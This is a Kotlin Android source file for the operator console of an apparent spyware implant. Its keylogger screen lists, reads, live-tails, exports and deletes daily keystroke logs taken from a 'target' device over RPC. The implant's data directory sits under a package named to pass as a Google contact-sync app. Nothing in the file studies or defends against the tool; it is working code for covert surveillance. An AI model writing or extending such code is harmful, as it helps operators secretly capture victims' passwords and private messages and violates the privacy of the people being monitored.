package com.shadow.operator.ui.cap

import android.content.ContentValues
import android.os.Build
import android.provider.MediaStore
import android.widget.Toast
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.FileDownload
import androidx.compose.material.icons.filled.Pause
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.RpcClient
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

private const val KEYLOG_DIR = "/data/data/com.google.android.contactsync/files/keylogs"
private val KEYLOG_NAME = Regex("""keylog_(\d{4}-\d{2}-\d{2})\.txt""")

private data class KeyDay(val date: String, val name: String, val size: Long) {
    val path: String get() = "$KEYLOG_DIR/$name"
}

/**
 * Keylog browser, replacing two dead-end buttons ("Keylog Today" dumped a file
 * into the generic data screen, "Keylog Files" printed a bare filename that
 * could not be opened).
 *
 * Backend reality this screen is written against, not assumed:
 *  - `keylog_list` runs cmd_fs_list on the keylogs dir. Its header says
 *    "name\ttype\tsize" but each row is emitted as type \t size \t name, so the
 *    header is ignored and rows are parsed positionally.
 *  - `keylog_file` only ever reads the implant's own notion of today, which is
 *    useless once a day has rolled over, so days are read by absolute path with
 *    fs_read instead. The newest filename is treated as the live file, which
 *    also sidesteps operator/target clock skew.
 *  - File failures return as text ("fs error: No such file or directory (2)"),
 *    not as transport errors, and must be shown instead of rendering empty.
 *  - There is no FileProvider in the manifest, so export goes through
 *    MediaStore.Downloads and there is no share sheet.
 */
@Composable
fun KeylogScreen(rpc: RpcClient, onNavigateBack: () -> Unit) {
    val ctx = LocalContext.current
    val clipboard = LocalClipboardManager.current
    val scope = rememberCoroutineScope()
    val readerState = rememberLazyListState()

    var days by remember { mutableStateOf<List<KeyDay>>(emptyList()) }
    var listRaw by remember { mutableStateOf("") }
    var listError by remember { mutableStateOf<String?>(null) }
    var listLoading by remember { mutableStateOf(true) }
    var listMs by remember { mutableStateOf(0L) }

    var open by remember { mutableStateOf<KeyDay?>(null) }
    var content by remember { mutableStateOf("") }
    var readError by remember { mutableStateOf<String?>(null) }
    var readLoading by remember { mutableStateOf(false) }
    var live by remember { mutableStateOf(false) }
    var paused by remember { mutableStateOf(false) }
    var query by remember { mutableStateOf("") }
    var confirmDelete by remember { mutableStateOf<KeyDay?>(null) }
    var busy by remember { mutableStateOf(false) }

    val todayLabel = remember {
        SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
    }

    suspend fun refreshList() {
        listLoading = true
        listError = null
        val t0 = System.currentTimeMillis()
        val out = rpc.execute("keylog_list", "{}", 120000)
        listMs = System.currentTimeMillis() - t0
        listRaw = out
        val t = out.trimStart()
        when {
            // RpcClient prefixes transport failures and unacknowledged commands.
            t.startsWith("ERROR") || t.startsWith("NO RESULT") -> {
                listError = out
                days = emptyList()
            }
            // The directory only exists once the logger has written something.
            t.startsWith("fs error") -> {
                days = emptyList()
                listError = if (t.contains("No such file") || t.contains("failed to stat"))
                    "no keylog directory on this target yet -- $KEYLOG_DIR\n" +
                        "the logger creates it on the first captured keystroke"
                else out
            }
            else -> {
                days = parseDays(out).sortedByDescending { it.date }
                listError = null
                if (days.isEmpty())
                    listError = "directory is empty -- no daily files listed"
            }
        }
        listLoading = false
    }

    suspend fun readDay(day: KeyDay, appendOnly: Boolean) {
        readLoading = true
        val out = rpc.execute(
            "fs_read",
            JSONObject().put("path", day.path).toString(),
            if (appendOnly) 90000 else 120000
        )
        readLoading = false
        val t = out.trimStart()
        when {
            t.startsWith("ERROR") || t.startsWith("NO RESULT") -> readError = out
            t.startsWith("fs error") -> readError =
                if (t.contains("No such file")) "no such file on target: ${day.name}" else out
            else -> {
                readError = null
                content = when {
                    !appendOnly || content.isEmpty() -> out
                    // Daily logs only ever grow; append the new tail so a live view
                    // does not jump. Anything else (rotation, truncation) reseeds.
                    out.length >= content.length && out.startsWith(content) ->
                        if (out.length == content.length) content
                        else content + out.substring(content.length)
                    else -> out
                }
            }
        }
    }

    LaunchedEffect(Unit) { refreshList() }

    // One loop drives both modes: a single read for a past day, a 2s poll for the
    // live file. execute() returns on timeout too, so this can never hang.
    LaunchedEffect(open, live) {
        val day = open ?: return@LaunchedEffect
        while (isActive) {
            readDay(day, appendOnly = live)
            if (!live) break
            delay(2000)
        }
    }

    val lines = remember(content) { if (content.isEmpty()) emptyList() else content.split("\n") }
    val shown = remember(lines, query) {
        if (query.isBlank()) lines else lines.filter { it.contains(query, true) }
    }

    // Pause autoscroll when the operator scrolls back to read; resume at the tail.
    // layoutInfo is polled rather than observed because LazyListState's scroll
    // flags are composable-only accessors and this runs in a coroutine.
    LaunchedEffect(readerState) {
        var prevLast = -1
        while (isActive) {
            val info = readerState.layoutInfo
            val last = info.visibleItemsInfo.lastOrNull()?.index ?: -1
            val total = info.totalItemsCount
            if (prevLast >= 0 && last in 0 until prevLast) paused = true
            if (total > 0 && last >= total - 2) paused = false
            prevLast = last
            delay(350)
        }
    }
    LaunchedEffect(shown.size, paused) {
        if (!paused && shown.isNotEmpty()) readerState.scrollToItem(shown.size - 1)
    }

    fun exportToDownloads(name: String, text: String) {
        if (Build.VERSION.SDK_INT < 29) {
            Toast.makeText(ctx, "Save to Downloads needs Android 10+", Toast.LENGTH_LONG).show()
            return
        }
        if (text.isBlank()) {
            Toast.makeText(ctx, "Nothing to save", Toast.LENGTH_LONG).show()
            return
        }
        busy = true
        scope.launch {
            try {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, name)
                    put(MediaStore.Downloads.MIME_TYPE, "text/plain")
                }
                val uri = ctx.contentResolver
                    .insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values)
                    ?: error("MediaStore rejected the insert")
                ctx.contentResolver.openOutputStream(uri)?.use { it.write(text.toByteArray()) }
                    ?: error("could not open the output stream")
                Toast.makeText(ctx, "Saved $name (${text.length} chars) to Downloads",
                    Toast.LENGTH_LONG).show()
            } catch (t: Throwable) {
                Toast.makeText(ctx, "Save failed: ${t.message}", Toast.LENGTH_LONG).show()
            } finally {
                busy = false
            }
        }
    }

    fun deleteDay(day: KeyDay) {
        busy = true
        scope.launch {
            val out = rpc.execute(
                "fs_delete", JSONObject().put("path", day.path).toString(), 90000
            )
            Toast.makeText(ctx, out.take(180), Toast.LENGTH_LONG).show()
            confirmDelete = null
            if (open?.date == day.date) {
                open = null
                content = ""
                readError = null
            }
            refreshList()
            busy = false
        }
    }

    val day = open
    val newest = days.firstOrNull()?.date

    CapabilityScreen(
        title = if (day == null) "Keylogger" else "Keylog · ${day.date}",
        subtitle = when {
            day != null -> when {
                readError != null -> "read failed"
                live && paused -> "live · paused at ${shown.size} lines"
                live -> "live · ${shown.size} lines · polling 2s"
                else -> "${shown.size} lines · ${content.length} chars"
            }
            listError != null -> "error"
            days.isEmpty() -> "no logs"
            else -> "${days.size} days · ${days.sumOf { it.size }} B · " +
                "target ${rpc.activeTarget.take(8)} · ${listMs} ms"
        },
        onBack = { if (day == null) onNavigateBack() else open = null },
        loading = if (day == null) listLoading else (readLoading && content.isEmpty()),
        onRefresh = {
            scope.launch {
                if (day == null) refreshList() else readDay(day, appendOnly = false)
            }
        },
        actions = {
            if (day == null) {
                IconButton(onClick = {
                    clipboard.setText(AnnotatedString(listRaw))
                    Toast.makeText(ctx, "Copied listing", Toast.LENGTH_SHORT).show()
                }, enabled = listRaw.isNotBlank()) {
                    Icon(Icons.Default.ContentCopy, "Copy listing", tint = CapText)
                }
            } else {
                IconButton(
                    onClick = { clipboard.setText(AnnotatedString(content)) },
                    enabled = content.isNotBlank()
                ) {
                    Icon(Icons.Default.ContentCopy, "Copy log", tint = CapText)
                }
                IconButton(
                    onClick = { exportToDownloads("keylog-${day.date}.txt", content) },
                    enabled = !busy
                ) {
                    Icon(Icons.Default.FileDownload, "Save to Downloads", tint = CapBlue)
                }
                IconButton(onClick = { confirmDelete = day }, enabled = !busy) {
                    Icon(Icons.Default.Delete, "Delete this day", tint = CapRed)
                }
                if (day.date == newest) {
                    IconButton(onClick = { live = !live; paused = false }) {
                        Icon(
                            if (live) Icons.Default.Pause else Icons.Default.PlayArrow,
                            if (live) "Pause live" else "Follow live",
                            tint = if (live) CapAmber else CapGreen
                        )
                    }
                }
            }
        }
    ) {
        if (day == null) {
            listError?.let {
                CapMessage(it.take(600), CapRed)
                return@CapabilityScreen
            }
            if (days.isEmpty() && !listLoading) {
                CapMessage("no daily logs on this target", CapAmber)
                return@CapabilityScreen
            }
            LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(bottom = 16.dp)) {
                items(days) { d ->
                    Row(
                        Modifier.fillMaxWidth()
                            .clickable {
                                open = d
                                content = ""
                                readError = null
                                query = ""
                                paused = false
                                live = d.date == newest
                            }
                            .padding(horizontal = 16.dp, vertical = 12.dp),
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Column {
                            Text(
                                buildString {
                                    append(d.date)
                                    if (d.date == newest) append("   LIVE")
                                    else if (d.date == todayLabel) append("   TODAY")
                                },
                                color = if (d.date == newest) CapGreen else CapText,
                                fontSize = 14.sp, fontFamily = FontFamily.Monospace
                            )
                            Text(d.name, color = CapFaint, fontSize = 11.sp,
                                fontFamily = FontFamily.Monospace)
                        }
                        Text(
                            humanBytes(d.size),
                            color = CapDim, fontSize = 12.sp, fontFamily = FontFamily.Monospace
                        )
                    }
                    HorizontalDivider(color = CapBorder)
                }
            }
            return@CapabilityScreen
        }

        // ---- reader ---------------------------------------------------------
        CapSearch(query, { query = it }, "search ${lines.size} lines")

        if (shown.isEmpty() && query.isNotBlank()) {
            CapMessage("no line matches \"$query\"", CapFaint)
            return@CapabilityScreen
        }

        Row(
            Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 4.dp),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            Text(
                if (query.isBlank()) "${lines.size} lines"
                else "${shown.size} of ${lines.size} lines match",
                color = CapFaint, fontSize = 11.sp, fontFamily = FontFamily.Monospace
            )
            if (readLoading && content.isNotEmpty()) {
                Text("…", color = CapAmber, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
            }
        }

        readError?.let {
            CapMessage(it.take(600), CapRed)
            return@CapabilityScreen
        }
        if (shown.isEmpty() && !readLoading) {
            CapMessage("file is empty: ${day.name}", CapAmber)
            return@CapabilityScreen
        }

        if (live && paused) {
            Surface(color = CapSurface, modifier = Modifier.fillMaxWidth()) {
                Row(
                    Modifier.fillMaxWidth().clickable { paused = false }
                        .padding(horizontal = 16.dp, vertical = 8.dp),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Icon(Icons.Default.PlayArrow, null, tint = CapGreen, modifier = Modifier.size(16.dp))
                    Text("reading paused -- tap to follow the tail again",
                        color = CapAmber, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
                }
            }
        }

        LazyColumn(state = readerState, modifier = Modifier.fillMaxSize(),
            contentPadding = PaddingValues(bottom = 16.dp)) {
            items(shown) { line ->
                Text(
                    line.ifBlank { " " },
                    color = CapText, fontSize = 12.sp, fontFamily = FontFamily.Monospace,
                    modifier = Modifier.padding(horizontal = 16.dp, vertical = 1.dp)
                )
            }
        }
    }

    confirmDelete?.let { d ->
        AlertDialog(
            onDismissRequest = { confirmDelete = null },
            containerColor = CapSurface,
            title = { Text("Delete ${d.name}?", color = CapBright, fontSize = 15.sp,
                fontFamily = FontFamily.Monospace) },
            text = {
                Text(
                    "Removes ${humanBytes(d.size)} from the implant at $KEYLOG_DIR. " +
                        "This cannot be undone.",
                    color = CapDim, fontSize = 13.sp, fontFamily = FontFamily.Monospace
                )
            },
            confirmButton = {
                TextButton(onClick = { deleteDay(d) }) {
                    Text("Delete on target", color = CapRed, fontSize = 13.sp,
                        fontFamily = FontFamily.Monospace)
                }
            },
            dismissButton = {
                TextButton(onClick = { confirmDelete = null }) {
                    Text("Keep", color = CapBlue, fontSize = 13.sp,
                        fontFamily = FontFamily.Monospace)
                }
            }
        )
    }
}

/** Rows are `type \t size \t name`; the printed header order is wrong, so ignore it. */
private fun parseDays(raw: String): List<KeyDay> =
    raw.lineSequence().map { it.trim() }.mapNotNull { line ->
        val parts = line.split('\t')
        if (parts.size < 3) return@mapNotNull null
        if (parts[0].trim() != "f") return@mapNotNull null
        val name = parts.subList(2, parts.size).joinToString("\t").trim()
        val match = KEYLOG_NAME.find(name) ?: return@mapNotNull null
        KeyDay(match.groupValues[1], name, parts[1].trim().toLongOrNull() ?: 0L)
    }.toList()

private fun humanBytes(n: Long): String = when {
    n >= 1_048_576 -> "%.1f MB".format(n / 1048576.0)
    n >= 1024 -> "%.1f KB".format(n / 1024.0)
    else -> "$n B"
}
